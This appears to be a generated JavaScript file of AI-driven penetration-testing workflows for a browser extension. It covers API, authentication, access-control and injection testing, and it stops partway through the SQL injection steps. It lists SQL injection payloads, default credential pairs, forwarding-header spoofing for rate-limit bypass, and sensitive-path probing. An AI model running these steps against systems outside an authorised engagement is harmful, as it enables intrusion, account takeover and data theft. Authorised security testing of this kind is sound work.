/**
 * Void Extension — Workflow Definitions
 * Assigned to window.VOID_WORKFLOWS
 *
 * GENERATED by scripts/bundle-workflows.py from Agent-zero-pentest — do not edit
 * by hand. User edits belong in the panel (AI Settings -> Workflows), which
 * stores them as an overlay in chrome.storage rather than touching this file.
 *
 * Three levels, mirroring the source:
 *   atomic      one technique, whose decision tree the model walks step by step
 *   composite   an ordered chain of atomic workflows
 *   engagement  named phases pulling in workflows and extra checks
 *
 * Each step:
 *   id, name, type ('SKILL' | 'AGENT' | 'PHASE'), dependsOn[]
 *   goal            what the step is trying to establish
 *   intrusive       whether it sends attack traffic
 *   decisionTree[]  { action, approach, ifPositive, ifNegative, stopWhen }
 *   toolGuidance    { aiShould, useToolWhen }
 *   techniqueRefs[] technique slugs
 *   validation      { mustReproduce, contextCheck, impactAssessment }
 *   includes[]      (PHASE only) referenced workflows with their goals inlined
 *   extraChecks[]   (PHASE only) hybrid check ids to run in this phase
 */

window.VOID_WORKFLOWS = [
  {
    "id": "api-assessment",
    "name": "Api Assessment",
    "description": "REST/GraphQL API security assessment — recon, auth, and OWASP API Top 10",
    "level": "engagement",
    "category": "engagement",
    "ref": "engagement/api-assessment",
    "steps": [
      {
        "id": "api-recon",
        "name": "API Recon",
        "type": "PHASE",
        "skill": "",
        "dependsOn": [],
        "goal": "Map the API surface — endpoints, versions, parameters, auth scheme, and object model",
        "intrusive": false,
        "decisionTree": [],
        "toolGuidance": {
          "aiShould": "",
          "useToolWhen": {}
        },
        "techniqueRefs": [],
        "extraChecks": [],
        "validation": {
          "mustReproduce": false,
          "contextCheck": "",
          "impactAssessment": ""
        },
        "includes": [
          {
            "ref": "atomic/recon/endpoint-discovery",
            "name": "endpoint-discovery",
            "goal": "Build a complete map of the application's attack surface by crawling the site, discovering hidden paths via wordlist brute-force, and extracting endpoints from JavaScript files and API responses. The output feeds all subsequent injection and access-control tests."
          },
          {
            "ref": "atomic/recon/tech-stack-fingerprint",
            "name": "tech-stack-fingerprint",
            "goal": "Determine the full technology stack of the target including web server, backend language, framework, database indicators, and CDN/WAF presence. This information drives payload selection for all subsequent tests."
          }
        ]
      },
      {
        "id": "authentication",
        "name": "Authentication",
        "type": "PHASE",
        "skill": "",
        "dependsOn": [
          "api-recon"
        ],
        "goal": "Test the API's authentication and token handling",
        "intrusive": false,
        "decisionTree": [],
        "toolGuidance": {
          "aiShould": "",
          "useToolWhen": {}
        },
        "techniqueRefs": [],
        "extraChecks": [],
        "validation": {
          "mustReproduce": false,
          "contextCheck": "",
          "impactAssessment": ""
        },
        "includes": [
          {
            "ref": "composite/test-authentication",
            "name": "test-authentication",
            "goal": ""
          }
        ]
      },
      {
        "id": "api-object-and-property-security",
        "name": "API Object & Property Security",
        "type": "PHASE",
        "skill": "",
        "dependsOn": [
          "authentication"
        ],
        "goal": "Test object-level authorization, property auto-binding, and resource consumption",
        "intrusive": false,
        "decisionTree": [],
        "toolGuidance": {
          "aiShould": "",
          "useToolWhen": {}
        },
        "techniqueRefs": [],
        "extraChecks": [],
        "validation": {
          "mustReproduce": false,
          "contextCheck": "",
          "impactAssessment": ""
        },
        "includes": [
          {
            "ref": "composite/test-api-security",
            "name": "test-api-security",
            "goal": ""
          }
        ]
      },
      {
        "id": "injection",
        "name": "Injection",
        "type": "PHASE",
        "skill": "",
        "dependsOn": [
          "api-object-and-property-security"
        ],
        "goal": "Test API parameters and bodies for injection (SQLi, NoSQL, command)",
        "intrusive": false,
        "decisionTree": [],
        "toolGuidance": {
          "aiShould": "",
          "useToolWhen": {}
        },
        "techniqueRefs": [],
        "extraChecks": [],
        "validation": {
          "mustReproduce": false,
          "contextCheck": "",
          "impactAssessment": ""
        },
        "includes": [
          {
            "ref": "atomic/injection/sqli-form",
            "name": "sqli-form",
            "goal": "Identify SQL injection vulnerabilities in form-based inputs by sending error-triggering payloads, boolean-based probes, and time-based blind payloads. Confirm exploitability and determine database type."
          },
          {
            "ref": "atomic/injection/cmdi-detect",
            "name": "cmdi-detect",
            "goal": "Identify command injection vulnerabilities in parameters that may be passed to shell commands on the server. Use both in-band and out-of-band detection techniques to confirm execution without relying solely on visible response changes."
          }
        ]
      },
      {
        "id": "validation-and-reporting",
        "name": "Validation & Reporting",
        "type": "PHASE",
        "skill": "",
        "dependsOn": [
          "injection"
        ],
        "goal": "Validate all findings against evidence and produce the report",
        "intrusive": false,
        "decisionTree": [],
        "toolGuidance": {
          "aiShould": "",
          "useToolWhen": {}
        },
        "techniqueRefs": [],
        "extraChecks": [],
        "validation": {
          "mustReproduce": true,
          "contextCheck": "",
          "impactAssessment": ""
        },
        "includes": []
      }
    ]
  },
  {
    "id": "full-pentest",
    "name": "Full Pentest",
    "description": "Complete penetration test — all 16 check classes, recon through reporting",
    "level": "engagement",
    "category": "engagement",
    "ref": "engagement/full-pentest",
    "steps": [
      {
        "id": "reconnaissance",
        "name": "Reconnaissance",
        "type": "PHASE",
        "skill": "",
        "dependsOn": [],
        "goal": "Map the attack surface — endpoints, parameters, tech stack, auth mechanisms",
        "intrusive": false,
        "decisionTree": [],
        "toolGuidance": {
          "aiShould": "",
          "useToolWhen": {}
        },
        "techniqueRefs": [],
        "extraChecks": [],
        "validation": {
          "mustReproduce": false,
          "contextCheck": "",
          "impactAssessment": ""
        },
        "includes": [
          {
            "ref": "atomic/recon/endpoint-discovery",
            "name": "endpoint-discovery",
            "goal": "Build a complete map of the application's attack surface by crawling the site, discovering hidden paths via wordlist brute-force, and extracting endpoints from JavaScript files and API responses. The output feeds all subsequent injection and access-control tests."
          },
          {
            "ref": "atomic/recon/tech-stack-fingerprint",
            "name": "tech-stack-fingerprint",
            "goal": "Determine the full technology stack of the target including web server, backend language, framework, database indicators, and CDN/WAF presence. This information drives payload selection for all subsequent tests."
          }
        ]
      },
      {
        "id": "authentication-testing",
        "name": "Authentication Testing",
        "type": "PHASE",
        "skill": "",
        "dependsOn": [
          "reconnaissance"
        ],
        "goal": "Test login mechanisms for weaknesses",
        "intrusive": false,
        "decisionTree": [],
        "toolGuidance": {
          "aiShould": "",
          "useToolWhen": {}
        },
        "techniqueRefs": [],
        "extraChecks": [],
        "validation": {
          "mustReproduce": false,
          "contextCheck": "",
          "impactAssessment": ""
        },
        "includes": [
          {
            "ref": "composite/test-authentication",
            "name": "test-authentication",
            "goal": ""
          }
        ]
      },
      {
        "id": "injection-testing",
        "name": "Injection Testing",
        "type": "PHASE",
        "skill": "",
        "dependsOn": [
          "authentication-testing"
        ],
        "goal": "Test all input points for injection vulnerabilities",
        "intrusive": false,
        "decisionTree": [],
        "toolGuidance": {
          "aiShould": "",
          "useToolWhen": {}
        },
        "techniqueRefs": [],
        "extraChecks": [],
        "validation": {
          "mustReproduce": false,
          "contextCheck": "",
          "impactAssessment": ""
        },
        "includes": [
          {
            "ref": "composite/test-injection",
            "name": "test-injection",
            "goal": ""
          }
        ]
      },
      {
        "id": "access-control-testing",
        "name": "Access Control Testing",
        "type": "PHASE",
        "skill": "",
        "dependsOn": [
          "injection-testing"
        ],
        "goal": "Test for IDOR, privilege escalation, forced browsing",
        "intrusive": false,
        "decisionTree": [],
        "toolGuidance": {
          "aiShould": "",
          "useToolWhen": {}
        },
        "techniqueRefs": [],
        "extraChecks": [],
        "validation": {
          "mustReproduce": false,
          "contextCheck": "",
          "impactAssessment": ""
        },
        "includes": [
          {
            "ref": "composite/test-access-control",
            "name": "test-access-control",
            "goal": ""
          }
        ]
      },
      {
        "id": "configuration-and-hardening",
        "name": "Configuration & Hardening",
        "type": "PHASE",
        "skill": "",
        "dependsOn": [
          "access-control-testing"
        ],
        "goal": "Test for misconfigurations, weak sessions, missing security headers",
        "intrusive": false,
        "decisionTree": [],
        "toolGuidance": {
          "aiShould": "",
          "useToolWhen": {}
        },
        "techniqueRefs": [],
        "extraChecks": [
          "csrf",
          "upload",
          "open-redirect",
          "weak-session",
          "csp"
        ],
        "validation": {
          "mustReproduce": false,
          "contextCheck": "",
          "impactAssessment": ""
        },
        "includes": []
      },
      {
        "id": "validation-and-reporting",
        "name": "Validation & Reporting",
        "type": "PHASE",
        "skill": "",
        "dependsOn": [
          "configuration-and-hardening"
        ],
        "goal": "Validate all findings, generate report with evidence",
        "intrusive": false,
        "decisionTree": [],
        "toolGuidance": {
          "aiShould": "",
          "useToolWhen": {}
        },
        "techniqueRefs": [],
        "extraChecks": [],
        "validation": {
          "mustReproduce": true,
          "contextCheck": "",
          "impactAssessment": ""
        },
        "includes": []
      }
    ]
  },
  {
    "id": "quick-scan",
    "name": "Quick Scan",
    "description": "Fast top-10 security check",
    "level": "engagement",
    "category": "engagement",
    "ref": "engagement/quick-scan",
    "steps": [
      {
        "id": "quick-recon",
        "name": "Quick Recon",
        "type": "PHASE",
        "skill": "",
        "dependsOn": [],
        "goal": "Identify main endpoints and tech stack",
        "intrusive": false,
        "decisionTree": [],
        "toolGuidance": {
          "aiShould": "",
          "useToolWhen": {}
        },
        "techniqueRefs": [],
        "extraChecks": [],
        "validation": {
          "mustReproduce": false,
          "contextCheck": "",
          "impactAssessment": ""
        },
        "includes": [
          {
            "ref": "atomic/recon/endpoint-discovery",
            "name": "endpoint-discovery",
            "goal": "Build a complete map of the application's attack surface by crawling the site, discovering hidden paths via wordlist brute-force, and extracting endpoints from JavaScript files and API responses. The output feeds all subsequent injection and access-control tests."
          }
        ]
      },
      {
        "id": "top-checks",
        "name": "Top Checks",
        "type": "PHASE",
        "skill": "",
        "dependsOn": [
          "quick-recon"
        ],
        "goal": "Test for the most common/critical vulnerabilities",
        "intrusive": false,
        "decisionTree": [],
        "toolGuidance": {
          "aiShould": "",
          "useToolWhen": {}
        },
        "techniqueRefs": [],
        "extraChecks": [],
        "validation": {
          "mustReproduce": false,
          "contextCheck": "",
          "impactAssessment": ""
        },
        "includes": [
          {
            "ref": "atomic/injection/sqli-form",
            "name": "sqli-form",
            "goal": "Identify SQL injection vulnerabilities in form-based inputs by sending error-triggering payloads, boolean-based probes, and time-based blind payloads. Confirm exploitability and determine database type."
          },
          {
            "ref": "atomic/injection/xss-reflected",
            "name": "xss-reflected",
            "goal": "Identify reflected XSS vulnerabilities by injecting probe strings into URL parameters, form fields, and HTTP headers, then confirming unescaped reflection in the HTML response. Determine execution context and craft a working PoC payload."
          },
          {
            "ref": "atomic/auth/default-creds",
            "name": "default-creds",
            "goal": "Attempt authentication with default and commonly-used credentials on all discovered login endpoints. Cover application defaults, framework defaults, and the most common weak passwords. Stop immediately on first successful authentication to avoid lockout."
          },
          {
            "ref": "atomic/access-control/forced-browsing",
            "name": "forced-browsing",
            "goal": "Identify access control failures where protected pages, admin panels, API endpoints, or sensitive files are accessible by directly navigating to their URLs without proper authentication or authorization checks."
          }
        ]
      }
    ]
  },
  {
    "id": "test-access-control",
    "name": "Test Access Control",
    "description": "Test for access control vulnerabilities",
    "level": "composite",
    "category": "access-control",
    "ref": "composite/test-access-control",
    "steps": [
      {
        "id": "idor-check",
        "name": "idor-check",
        "type": "SKILL",
        "skill": "idor-check",
        "ref": "atomic/access-control/idor-check",
        "dependsOn": [],
        "category": "access-control",
        "goal": "Identify IDOR vulnerabilities by manipulating object identifiers in API requests, URLs, and form parameters to access or modify resources belonging to other users. Test both horizontal (same privilege level) and vertical (cross-privilege) access control boundaries.",
        "intrusive": true,
        "decisionTree": [
          {
            "action": "Identify all numeric IDs, GUIDs, and user-specific identifiers in requests",
            "approach": "Map every parameter that references a resource: /api/user/123, order_id=456, file=abc.pdf",
            "ifPositive": "IDs found — create two test accounts to enable cross-account testing",
            "ifNegative": "No direct IDs visible — check for encoded IDs (base64, hash) in responses",
            "stopWhen": ""
          },
          {
            "action": "With two test accounts, access Account A's resources using Account B's session token",
            "approach": "",
            "ifPositive": "Account B can read Account A's data — horizontal IDOR confirmed",
            "ifNegative": "403 returned — test modification (PUT/PATCH/DELETE) instead of just reads",
            "stopWhen": ""
          },
          {
            "action": "Attempt to modify or delete Account A's resources using Account B's session",
            "approach": "",
            "ifPositive": "Modification/deletion succeeds — write-IDOR confirmed (higher severity)",
            "ifNegative": "Read-only IDOR protected against writes — check for mass assignment in update endpoints",
            "stopWhen": ""
          },
          {
            "action": "Test vertical IDOR: use a low-privilege account to access admin-only resource IDs",
            "approach": "",
            "ifPositive": "Admin resource accessible by regular user — vertical privilege escalation confirmed",
            "ifNegative": "Admin resources properly restricted — IDOR scope limited to horizontal only",
            "stopWhen": ""
          },
          {
            "action": "Test indirect IDOR: change email/username in profile to an existing account's value",
            "approach": "",
            "ifPositive": "Account takeover via indirect IDOR — critical finding",
            "ifNegative": "No additional IDOR vectors — document all tested parameters",
            "stopWhen": "All resource ID parameters tested across both horizontal and vertical boundaries"
          }
        ],
        "toolGuidance": {
          "aiShould": "Systematically map every resource identifier before testing. Maintain two distinct browser sessions simultaneously for cross-account comparison. Sequential integer IDs are highest priority — test ID-1 and ID+1 from your own account ID to find neighbors.",
          "useToolWhen": {
            "burp_proxy": "Replay requests with modified IDs while preserving the other account's session cookie",
            "browser_navigate": "Maintain separate authenticated sessions for each test account"
          }
        },
        "techniqueRefs": [
          "idor-horizontal",
          "idor-vertical",
          "idor-guid-prediction",
          "idor-indirect"
        ],
        "validation": {
          "mustReproduce": true,
          "contextCheck": "Confirm that the accessed resource belongs to a different user, not a shared resource",
          "impactAssessment": "Determine what sensitive data is exposed: PII, financial records, private messages"
        }
      },
      {
        "id": "forced-browsing",
        "name": "forced-browsing",
        "type": "SKILL",
        "skill": "forced-browsing",
        "ref": "atomic/access-control/forced-browsing",
        "dependsOn": [
          "idor-check"
        ],
        "category": "access-control",
        "goal": "Identify access control failures where protected pages, admin panels, API endpoints, or sensitive files are accessible by directly navigating to their URLs without proper authentication or authorization checks.",
        "intrusive": true,
        "decisionTree": [
          {
            "action": "Collect all URLs discovered during recon that require authentication",
            "approach": "Log out and attempt to directly access each authenticated URL",
            "ifPositive": "Authenticated page loads without login — unauthenticated access confirmed",
            "ifNegative": "Redirect to login — test with a lower-privilege authenticated session instead",
            "stopWhen": ""
          },
          {
            "action": "With a low-privilege account, directly access admin or high-privilege URLs",
            "approach": "",
            "ifPositive": "Admin page loads for regular user — vertical privilege escalation via forced browsing",
            "ifNegative": "403 returned — check if error page leaks sensitive information",
            "stopWhen": ""
          },
          {
            "action": "Test predictable backup and configuration file paths: .bak, .old, .config, web.config, .env",
            "approach": "",
            "ifPositive": "Sensitive file returned — configuration or credential exposure confirmed",
            "ifNegative": "All return 404/403 — check for exposed .git, .svn, .DS_Store directories",
            "stopWhen": ""
          },
          {
            "action": "Test for exposed version control directories: /.git/config, /.svn/entries, /.git/HEAD",
            "approach": "",
            "ifPositive": "Git/SVN metadata accessible — source code exposure, reconstruct repo",
            "ifNegative": "No VCS exposure — check for exposed log files: /logs/, /debug, /error.log",
            "stopWhen": ""
          },
          {
            "action": "Test common sensitive endpoints not linked in the UI: /admin, /console, /debug, /metrics, /health",
            "approach": "",
            "ifPositive": "Unprotected sensitive endpoint found — document URL and accessible content",
            "ifNegative": "All sensitive paths protected — document as tested with no forced browsing finding",
            "stopWhen": "All discovered and common sensitive paths tested for unauthorized access"
          }
        ],
        "toolGuidance": {
          "aiShould": "Build a comprehensive list of URLs from the crawl before testing. Test each URL in three contexts: unauthenticated, low-privilege, and if possible a different user's session. Pay special attention to multi-step workflows that might skip authorization on intermediate steps.",
          "useToolWhen": {
            "browser_navigate": "Directly access URLs in different authentication contexts",
            "burp_proxy": "Strip or modify authorization headers to test endpoint-level auth checks"
          }
        },
        "techniqueRefs": [
          "access-control-forced-browsing",
          "access-control-missing-function-level",
          "recon-sensitive-file-exposure"
        ],
        "validation": {
          "mustReproduce": true,
          "contextCheck": "Confirm the accessed resource requires authorization (i.e., it's not publicly intended)",
          "impactAssessment": "Identify what data or functionality is exposed — admin actions, PII, credentials"
        }
      }
    ]
  },
  {
    "id": "test-api-security",
    "name": "Test Api Security",
    "description": "Test an API for the core OWASP API Top 10 object/property/consumption flaws",
    "level": "composite",
    "category": "api",
    "ref": "composite/test-api-security",
    "steps": [
      {
        "id": "bola-check",
        "name": "bola-check",
        "type": "SKILL",
        "skill": "bola-check",
        "ref": "atomic/api/bola-check",
        "dependsOn": [],
        "category": "api",
        "goal": "Identify BOLA (API-layer IDOR) where an API returns or modifies objects the caller should not access, based on an object identifier in the path, query, body, or header. Test horizontal (peer) and vertical (privilege) boundaries across every object-referencing endpoint.",
        "intrusive": true,
        "decisionTree": [
          {
            "action": "Enumerate object-referencing API endpoints and their ID parameters (/api/v1/orders/{id}, ?account=, body userId, X-Account-Id header)",
            "approach": "Capture the API traffic of a normal session; list every request that carries an object identifier",
            "ifPositive": "Object IDs found — provision two API tokens (Account A and Account B) for cross-account tests",
            "ifNegative": "IDs are opaque (UUID/hash) — check responses for leaked IDs and test predictability/enumeration",
            "stopWhen": ""
          },
          {
            "action": "Using Account B's token, request Account A's object IDs on each endpoint (GET first)",
            "approach": "",
            "ifPositive": "Account A's object returned to Account B — read BOLA confirmed",
            "ifNegative": "403/404 returned — proceed to write methods, which are often less guarded than reads",
            "stopWhen": ""
          },
          {
            "action": "Repeat with state-changing methods (PUT/PATCH/POST/DELETE) against Account A's IDs using Account B's token",
            "approach": "",
            "ifPositive": "Cross-account modify/delete succeeds — write BOLA confirmed (higher severity)",
            "ifNegative": "Writes rejected — test method override (X-HTTP-Method-Override) and alternate content types",
            "stopWhen": ""
          },
          {
            "action": "Test vertical BOLA: use a low-privilege token against admin/internal object IDs and endpoints",
            "approach": "",
            "ifPositive": "Privileged object reachable by low-privilege token — privilege escalation confirmed",
            "ifNegative": "Object authorization enforced server-side — document tested endpoints and IDs",
            "stopWhen": "Every object-referencing endpoint tested across horizontal and vertical boundaries"
          }
        ],
        "toolGuidance": {
          "aiShould": "Reason about the object-ownership model of the API before testing. The server, not the client, must enforce that the token owns the object — a 200 with someone else's data is the finding. Prefer sequential/guessable IDs and IDs leaked in list endpoints. Keep the two tokens' requests otherwise identical so only the authorization boundary is under test.",
          "useToolWhen": {
            "burp_proxy": "Replay each request swapping only the auth token/object ID, and diff the responses",
            "curl": "Script systematic ID substitution across the endpoint list"
          }
        },
        "techniqueRefs": [
          "idor-horizontal",
          "idor-vertical",
          "bola-id-enumeration"
        ],
        "validation": {
          "mustReproduce": true,
          "contextCheck": "Confirm the returned object belongs to a different tenant/user, not a shared or public resource",
          "impactAssessment": "Quantify exposed data (PII, financial, other tenants) and whether write access is possible"
        }
      },
      {
        "id": "mass-assignment",
        "name": "mass-assignment",
        "type": "SKILL",
        "skill": "mass-assignment",
        "ref": "atomic/api/mass-assignment",
        "dependsOn": [
          "bola-check"
        ],
        "category": "api",
        "goal": "Identify mass-assignment (API6:2023 / auto-binding) where an object-creation or update endpoint binds request fields directly to the model, letting a caller set attributes they should not control (role, isAdmin, balance, verified, owner_id, price).",
        "intrusive": true,
        "decisionTree": [
          {
            "action": "Capture a legitimate create/update request and read the object's full representation from a GET to learn all its fields",
            "approach": "Compare the fields the UI sends on write vs the fields present in the read response — the difference is the candidate set",
            "ifPositive": "Read exposes fields the write form never sends (role, isAdmin, credit) — candidate injection fields found",
            "ifNegative": "No extra fields visible — probe common privileged names anyway (isAdmin, is_admin, role, verified, owner, status)",
            "stopWhen": ""
          },
          {
            "action": "Resend the write request adding the candidate privileged field(s) with an attacker-favourable value",
            "approach": "",
            "ifPositive": "Server accepts and the follow-up GET reflects the injected value — mass assignment confirmed",
            "ifNegative": "Field ignored or rejected — try nested paths (user.role), array/object wrappers, and alternate content types (JSON vs form)",
            "stopWhen": ""
          },
          {
            "action": "Test on both create (POST) and update (PUT/PATCH) — update endpoints often bind more loosely",
            "approach": "",
            "ifPositive": "Privileged field bound on update — confirm the effect (elevated role, altered balance, changed ownership)",
            "ifNegative": "Both guarded — test field name casing and framework aliases (snake vs camel, GraphQL input types)",
            "stopWhen": ""
          },
          {
            "action": "Verify real impact, not just echo: re-authenticate or re-fetch to confirm the privileged state actually took effect",
            "approach": "",
            "ifPositive": "Record endpoint, injected field, before/after object state, and the resulting privilege change",
            "ifNegative": "Values echoed but not persisted/effective — note as non-exploitable",
            "stopWhen": "All write endpoints tested with the candidate privileged-field set"
          }
        ],
        "toolGuidance": {
          "aiShould": "Derive the candidate fields from the object's own read representation and from framework conventions — do not blind-fuzz. The finding is not that the server accepted an extra field, but that the extra field changed privileged state; always confirm with a fresh read. Reason about the backend framework (Rails/Django/Express/Spring) to predict binding behaviour and field names.",
          "useToolWhen": {
            "burp_proxy": "Replay write requests with added fields and inspect the persisted object via a follow-up read",
            "curl": "Iterate candidate field names and content types quickly"
          }
        },
        "techniqueRefs": [
          "mass-assignment",
          "api-object-property-abuse"
        ],
        "validation": {
          "mustReproduce": true,
          "contextCheck": "Confirm the injected field is genuinely privileged and not a normal user-editable attribute",
          "impactAssessment": "Show the concrete effect: privilege escalation, financial change, ownership takeover, or verification bypass"
        }
      },
      {
        "id": "rate-limit-check",
        "name": "rate-limit-check",
        "type": "SKILL",
        "skill": "rate-limit-check",
        "ref": "atomic/api/rate-limit-check",
        "dependsOn": [
          "mass-assignment"
        ],
        "category": "api",
        "goal": "Determine whether sensitive API operations (login, OTP/2FA, password reset, token issuance, expensive queries, messaging) enforce effective rate limiting, and whether any limit that exists can be trivially bypassed. Focus on security-relevant endpoints where the absence of a limit enables abuse.",
        "intrusive": true,
        "decisionTree": [
          {
            "action": "Identify security-sensitive endpoints (auth, OTP, reset, invite, search/export, payment) and send a controlled burst to each",
            "approach": "Send a modest, bounded burst (e.g. 30-50 requests) and watch for 429, Retry-After, or throttling headers — do NOT run credential brute force unless the engagement allows it",
            "ifPositive": "429/Retry-After appears — a limit exists; proceed to bypass testing",
            "ifNegative": "No throttling after the burst — missing rate limit; record the endpoint and observed throughput",
            "stopWhen": ""
          },
          {
            "action": "If a limit exists, test per-key bypasses: rotate IP via X-Forwarded-For/X-Real-IP, vary casing/trailing slash, add cache-buster params",
            "approach": "",
            "ifPositive": "Header/path variation resets the counter — limit is client-controllable, effectively bypassable",
            "ifNegative": "Limit holds across variations — test account/session dimension next",
            "stopWhen": ""
          },
          {
            "action": "Test the limit's dimension: is it per-IP, per-account, or global? Spread requests across sessions/accounts",
            "approach": "",
            "ifPositive": "Limit is per-IP only — distributed or multi-account abuse bypasses it for account-targeting attacks",
            "ifNegative": "Limit is per-account and enforced server-side — note as adequately controlled",
            "stopWhen": ""
          },
          {
            "action": "For OTP/2FA and reset flows specifically, verify the code-verification step is limited (not just the send step)",
            "approach": "",
            "ifPositive": "Verification step unlimited — enables OTP/token brute force; flag high severity",
            "ifNegative": "Verification limited and lockout enforced — document the control",
            "stopWhen": "Sensitive endpoints assessed for presence, dimension, and bypassability of limits"
          }
        ],
        "toolGuidance": {
          "aiShould": "Keep bursts bounded and respect the engagement config — this check probes for the ABSENCE of a limit, it is not a brute-force attack. Reason about the limit's dimension (IP vs account vs global) because that determines real exploitability. Prioritise endpoints where missing limits cause concrete harm: OTP/2FA verification, password reset, login, and expensive queries.",
          "useToolWhen": {
            "curl": "Send a bounded, counted burst and record status codes / Retry-After timing",
            "burp_proxy": "Replay with rotated forwarding headers and varied paths to test counter bypass"
          }
        },
        "techniqueRefs": [
          "rate-limit-bypass",
          "otp-brute-window",
          "resource-exhaustion"
        ],
        "validation": {
          "mustReproduce": true,
          "contextCheck": "Confirm the endpoint is security-sensitive and the observed throughput is genuinely unthrottled, not just a high ceiling",
          "impactAssessment": "Tie the gap to an abuse case: OTP/token brute force, account lockout DoS, cost amplification, or enumeration"
        }
      }
    ]
  },
  {
    "id": "test-authentication",
    "name": "Test Authentication",
    "description": "Test authentication mechanisms for weaknesses",
    "level": "composite",
    "category": "auth",
    "ref": "composite/test-authentication",
    "steps": [
      {
        "id": "default-creds",
        "name": "default-creds",
        "type": "SKILL",
        "skill": "default-creds",
        "ref": "atomic/auth/default-creds",
        "dependsOn": [],
        "category": "auth",
        "goal": "Attempt authentication with default and commonly-used credentials on all discovered login endpoints. Cover application defaults, framework defaults, and the most common weak passwords. Stop immediately on first successful authentication to avoid lockout.",
        "intrusive": true,
        "decisionTree": [
          {
            "action": "Identify all login endpoints discovered during recon (including admin panels, API auth)",
            "approach": "Check /admin, /login, /wp-admin, /manager, /console, /phpmyadmin, /api/auth",
            "ifPositive": "Login endpoint found — proceed with credential testing",
            "ifNegative": "No login found — check for HTTP basic auth prompts on sensitive paths",
            "stopWhen": ""
          },
          {
            "action": "Test admin/admin, admin/password, admin/123456, root/root, guest/guest against each endpoint",
            "approach": "",
            "ifPositive": "Login successful — immediately stop, document credential pair and access level",
            "ifNegative": "All failed — try application-specific defaults (tomcat/tomcat, pi/raspberry)",
            "stopWhen": ""
          },
          {
            "action": "Test vendor-specific defaults based on identified tech stack",
            "approach": "",
            "ifPositive": "Login successful — document, stop further testing on this endpoint",
            "ifNegative": "All vendor defaults failed — check if lockout policy is active before continuing",
            "stopWhen": ""
          },
          {
            "action": "If no lockout detected, test top-10 passwords from common breach lists",
            "approach": "",
            "ifPositive": "Credential found — record username, password, endpoint, and privilege level accessed",
            "ifNegative": "No valid credentials — document as tested with no finding",
            "stopWhen": "Successful login OR lockout triggered OR all common passwords exhausted"
          }
        ],
        "toolGuidance": {
          "aiShould": "Monitor response codes and body content carefully to distinguish between failed login (401/403/error message) and success (200/302 to dashboard). Watch for account lockout indicators after 5+ failures on the same account. Do not run automated spraying — test manually with targeted credential sets.",
          "useToolWhen": {
            "browser_navigate": "Submit credentials via login form and observe redirect/response",
            "burp_proxy": "Inspect POST parameters for login form field names before testing"
          }
        },
        "techniqueRefs": [
          "auth-default-creds",
          "auth-credential-stuffing-targeted"
        ],
        "validation": {
          "mustReproduce": true,
          "contextCheck": "Confirm authenticated session by accessing a protected resource after login",
          "impactAssessment": "Determine privilege level of the logged-in account (admin vs regular user)"
        }
      },
      {
        "id": "enumeration",
        "name": "enumeration",
        "type": "SKILL",
        "skill": "enumeration",
        "ref": "atomic/auth/enumeration",
        "dependsOn": [
          "default-creds"
        ],
        "category": "auth",
        "goal": "Identify valid usernames through response differences in login, registration, and password reset flows. Additionally detect weak authentication controls such as missing rate limiting, verbose error messages, and insecure account recovery mechanisms.",
        "intrusive": true,
        "decisionTree": [
          {
            "action": "Test login form with valid username + wrong password vs invalid username + wrong password",
            "approach": "Look for response time difference, error message difference, or HTTP status difference",
            "ifPositive": "Different response reveals valid usernames — enumerate common usernames (admin, user, test, support)",
            "ifNegative": "Identical responses — test password reset flow for username enumeration",
            "stopWhen": ""
          },
          {
            "action": "Test password reset endpoint: submit known-valid and known-invalid email addresses",
            "approach": "",
            "ifPositive": "Different response or email content confirms valid account — enumerate via reset",
            "ifNegative": "Identical responses — test registration endpoint for duplicate account detection",
            "stopWhen": ""
          },
          {
            "action": "Test registration: attempt to register with commonly-used usernames and observe error messages",
            "approach": "",
            "ifPositive": "Username taken error reveals valid account — document enumerable usernames",
            "ifNegative": "No enumeration vector found in registration — check timing side-channels",
            "stopWhen": ""
          },
          {
            "action": "Measure response time difference for valid vs invalid usernames with identical passwords",
            "approach": "",
            "ifPositive": "Timing difference > 100ms consistently indicates username enumeration via timing",
            "ifNegative": "No timing difference — authentication is resistant to username enumeration",
            "stopWhen": ""
          },
          {
            "action": "Test for rate limiting: send 20 rapid login attempts and check for lockout or throttling",
            "approach": "",
            "ifPositive": "No rate limit — flag as missing brute-force protection (medium finding)",
            "ifNegative": "Rate limit active — document threshold and lockout behavior",
            "stopWhen": "Rate limit policy documented and all enumeration vectors tested"
          }
        ],
        "toolGuidance": {
          "aiShould": "Carefully compare response bodies, not just status codes, for enumeration signals. Timing attacks require multiple samples to be statistically valid. Document exact response differences as evidence in findings.",
          "useToolWhen": {
            "burp_proxy": "Compare raw responses for login/reset/registration flows",
            "browser_navigate": "Interact with auth flows to observe full UI behavior"
          }
        },
        "techniqueRefs": [
          "auth-username-enum",
          "auth-timing-attack",
          "auth-rate-limit-bypass"
        ],
        "validation": {
          "mustReproduce": true,
          "contextCheck": "Verify enumeration signal is consistent across multiple requests, not intermittent",
          "impactAssessment": "Enumerate at least 3 valid usernames to demonstrate practical exploitability"
        }
      }
    ]
  },
  {
    "id": "test-injection",
    "name": "Test Injection",
    "description": "Test all injection vulnerability classes on discovered endpoints",
    "level": "composite",
    "category": "injection",
    "ref": "composite/test-injection",
    "steps": [
      {
        "id": "sqli-form",
        "name": "sqli-form",
        "type": "SKILL",
        "skill": "sqli-form",
        "ref": "atomic/injection/sqli-form",
        "dependsOn": [],
        "category": "injection",
        "goal": "Identify SQL injection vulnerabilities in form-based inputs by sending error-triggering payloads, boolean-based probes, and time-based blind payloads. Confirm exploitability and determine database type.",
        "intrusive": true,
        "decisionTree": [
          {
            "action": "Send a single quote ' to each form field and observe server response",
            "approach": "Start with the simplest error-triggering probe",
            "ifPositive": "SQL error returned — confirm injectable parameter, proceed to extract DB type",
            "ifNegative": "No error — try boolean-based probes",
            "stopWhen": ""
          },
          {
            "action": "Send boolean payloads: ' OR '1'='1 and ' OR '1'='2",
            "approach": "",
            "ifPositive": "Different responses confirm blind SQLi — proceed to time-based confirmation",
            "ifNegative": "Responses identical — try time-based blind injection",
            "stopWhen": ""
          },
          {
            "action": "Send time-based payload: '; WAITFOR DELAY '0:0:5'-- (MSSQL) or SLEEP(5) (MySQL)",
            "approach": "",
            "ifPositive": "Delay observed — confirmed blind time-based SQLi, record DB type and parameter",
            "ifNegative": "No delay — input may be filtered or not injectable; move on",
            "stopWhen": ""
          },
          {
            "action": "If injectable, determine DB type via error messages or DBMS-specific syntax probes",
            "approach": "",
            "ifPositive": "DB type identified — hand off to sqlmap for full exploitation",
            "ifNegative": "DB type unclear — try generic ORDER BY probes to count columns",
            "stopWhen": ""
          },
          {
